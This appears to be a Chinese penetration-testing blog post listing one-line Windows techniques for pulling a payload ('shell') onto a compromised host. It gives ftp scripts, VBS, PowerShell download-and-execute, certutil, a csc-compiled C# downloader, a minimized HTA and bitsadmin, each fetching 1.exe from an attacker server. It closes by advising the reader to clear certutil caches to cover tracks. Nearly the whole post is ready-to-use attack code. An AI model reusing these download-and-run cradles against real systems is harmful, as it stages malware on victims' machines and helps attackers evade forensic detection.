---
title: "一句话下载姿势总结"
date: 2019-05-23T14:11:16+08:00
draft: false
tags: ['shell','download']
categories: ['渗透测试']
---

在上一篇文章中，提到了下载shell的一些姿势，我们这篇文章来深入探究下。

<!--more-->

## ftp

```bash
echo open 192.168.1.1 21> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo ftp>> ftp.txt
echo GET 1.exe >> ftp.txt
ftp -s:ftp.txt
```

需要搭建ftp服务器，初次使用ftp下载防火墙会弹框拦截，使用前记得要先添加防火墙规则

## vbs

vbs downloader,使用msxml2.xmlhttp和adodb.stream对象

```vbscript
Set Post = CreateObject("Msxml2.XMLHTTP")
Set Shell = CreateObject("Wscript.Shell")
Post.Open "GET","http://192.168.1.1/1.exe",0
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile "C:\test\1.exe",2
```

## powershell

```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','C:\test\1.exe');start-process 'C:\test\1.exe'
```

## certutil

保存在当前路径，文件名称同URL

```bash
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
```

保存在当前路径，指定保存文件名称

```bash
certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php
```

使用downloader默认在缓存目录位置： `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`保存下载的文件副本

命令行删除缓存

```bash
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete
```

查看缓存项目：

```
certutil.exe -urlcache *
```

## csc

csc.exe是微软.NET Framework 中的C#编译器，Windows系统中默认包含，可在命令行下将cs文件编译成exe

download.cs

```c#
using System.Net;
namespace downloader
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string URLAddress = @"http://192.168.1.1/1.exe";
            string receivePath = @"C:\test\";
            client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName
        (URLAddress));
        }
    }
}
```

```bash
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tes
t\download.exe C:\test\download.cs
```

## hta

添加最小化和自动退出hta程序的功能，执行过程中会最小化hta窗口，下载文件结束后自动退出hta程序

将以下代码保存为hta文件

```html
<html>
<head>
<script>
var Object = new ActiveXObject("MSXML2.XMLHTTP");
Object.open("GET","http://192.168.1.1/1.exe",false);
Object.send();
if (Object.Status == 200)
{
    var Stream = new ActiveXObject("ADODB.Stream");
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.SaveToFile("C:\\test\\1.exe", 2);
    Stream.Close();
}
window.close();
</script>
<HTA:APPLICATION
WINDOWSTATE = "minimize">
</head>
<body>
</body>  
</html>
```

## bitsadmin

bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带

```bash
bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
```

**不支持https、ftp协议，php python带的服务器会出错**

---

写在文后，推荐使用powershell或certutil，但是记得清理缓存。